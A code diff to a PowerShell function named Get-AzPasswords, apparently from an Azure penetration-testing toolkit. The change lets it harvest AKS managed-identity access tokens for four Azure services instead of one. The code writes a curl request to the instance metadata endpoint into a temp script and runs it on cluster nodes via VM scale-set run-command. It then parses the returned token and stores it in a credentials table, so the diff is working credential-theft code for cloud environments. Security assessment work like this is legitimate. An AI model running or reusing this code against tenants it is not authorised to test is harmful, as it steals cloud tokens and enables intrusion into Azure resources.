@@ -996,29 +996,45 @@ Function Get-AzPasswords
             else{
                 Write-Verbose "`tGetting the Managed Identity Token from the $currentCluster AKS Cluster"
 
-                # Assumes Linux Clusters
-                "curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:'true'" | Out-File ".\tempscript2"
-            
-                # Run command on the VMSS cluster            
-                $commandOut = (Invoke-AzVmssVMRunCommand -ResourceGroupName $nodeRG -VMScaleSetName $nodeVMSS -InstanceId 0 -ScriptPath ".\tempscript2" -CommandId RunShellScript)
+                # Scoping URLs
+                $scoping_urls = @("https://management.azure.com/","https://graph.microsoft.com/","https://graph.windows.net/","https://vault.azure.net/")
 
-                # Write to file to correct the "ucs-2 le bom" encoding on the command output
-                $commandOut.Value[0].Message | Out-File ".\spTempFile2" -Encoding utf8
-                $utf8String = gc ".\spTempFile2"
+                # Scoping URL Counter variable
+                $counter = 2
 
-                # Convert commandOutput file to JSON object
-                $jsonSP = $utf8String[2..(($utf8String.Length)-8)] | ConvertFrom-Json
+                foreach ($i in $scoping_urls){ 
 
-                # Cast IDs and Secret to table variables
-                $accessToken = (-join("Access Token: ",$jsonSP.access_token))
-                $clientID = (-join("Client ID: ",$jsonSP.client_id))
+                    # Assumes Linux Clusters
+                    "curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$i' -H Metadata:'true'" | Out-File ".\tempscript$counter"
 
-                # Add creds to the table
-                $TempTblCreds.Rows.Add("AKS Cluster Service Principal ",$currentCluster,$clientID,$accessToken,"N/A","N/A","N/A","N/A","AKS-ManagedIdentity","N/A",$subName) | Out-Null
-            
-                # Delete Temp Files
-                del ".\spTempFile2"
-                del ".\tempscript2"
+                    # Run command on the VMSS cluster            
+                    $commandOut = (Invoke-AzVmssVMRunCommand -ResourceGroupName $nodeRG -VMScaleSetName $nodeVMSS -InstanceId 0 -ScriptPath ".\tempscript$counter" -CommandId RunShellScript)
+
+                    # Write to file to correct the "ucs-2 le bom" encoding on the command output
+                    $commandOut.Value[0].Message | Out-File ".\spTempFile$counter" -Encoding utf8
+                    $utf8String = gc ".\spTempFile$counter"
+
+                    # Convert commandOutput file to JSON object
+                    $jsonSP = $utf8String[2..(($utf8String.Length)-8)] | ConvertFrom-Json
+
+                    # Cast IDs and Secret to table variables
+                    $accessToken = (-join("Access Token: ",$jsonSP.access_token))
+                    $clientID = (-join("Client ID: ",$jsonSP.client_id))
+
+                    # Get Azure Service
+                    $service = $i.Split('/')[2].replace('.','-')
+
+                    # Add creds to the table
+                    $TempTblCreds.Rows.Add("AKS Cluster Service Principal ",$currentCluster,$clientID,$accessToken,"N/A","N/A","N/A","N/A","AKS-ManagedIdentity-$service","N/A",$subName) | Out-Null
+                
+                    # Delete Temp Files
+                    del ".\spTempFile$counter"
+                    del ".\tempscript$counter"
+
+                    # Increase counter variables
+                    $counter++
+                }
+
 
             }
 
